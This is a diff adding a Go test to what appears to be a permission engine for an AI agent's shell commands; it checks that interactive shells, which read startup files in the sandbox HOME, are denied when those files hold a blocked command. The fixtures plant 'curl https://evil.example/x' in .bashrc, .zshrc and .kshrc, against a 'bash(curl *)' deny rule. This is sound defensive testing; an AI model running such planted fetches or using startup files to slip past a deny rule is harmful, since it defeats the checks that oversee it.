@@ -371,3 +371,38 @@ func TestRulesReadTheStartupFilesInTheSandboxsHome(t *testing.T) {
 		}
 	}
 }
+
+// A shell typed at a terminal with no command and no script reads that
+// terminal, so it starts interactive and reads .bashrc, .zshrc or .kshrc
+// from the sandbox's HOME; a command line run by the agent does not.
+func TestTerminalLineShellReadsItsInteractiveFiles(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	for _, n := range []string{".bashrc", ".zshrc", ".kshrc"} {
+		if err := os.WriteFile(filepath.Join(home, n), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := os.WriteFile(filepath.Join(ws, "s.sh"), []byte("echo safe\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	e := New(ModeBypass)
+	e.Roots = func() []string { return []string{ws} }
+	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return home, true }
+	if err := e.AddDeny("bash(curl *)"); err != nil {
+		t.Fatal(err)
+	}
+	for c, want := range map[string]Decision{
+		"bash": Deny, "exec bash": Deny, "zsh": Deny, "bash -l": Deny, "ksh": Deny, "bash --": Deny,
+		"bash -s": Deny, "exec -a x bash": Deny,
+		"bash --norc": Allow, "bash -c true": Allow, "bash s.sh": Allow, "sh": Allow, "bash --rcfile /dev/null": Allow,
+	} {
+		line := e.EvaluateLine("bash", true, args(map[string]string{"command": c}))
+		if line.Decision != want {
+			t.Errorf("typed %q = %s (%s), want %s", c, line.Decision, line.Reason, want)
+		}
+	}
+	if res := e.Evaluate("bash", true, args(map[string]string{"command": "bash"})); res.Decision != Allow {
+		t.Errorf("the agent's bash, reading no terminal: %s (%s)", res.Decision, res.Reason)
+	}
+}
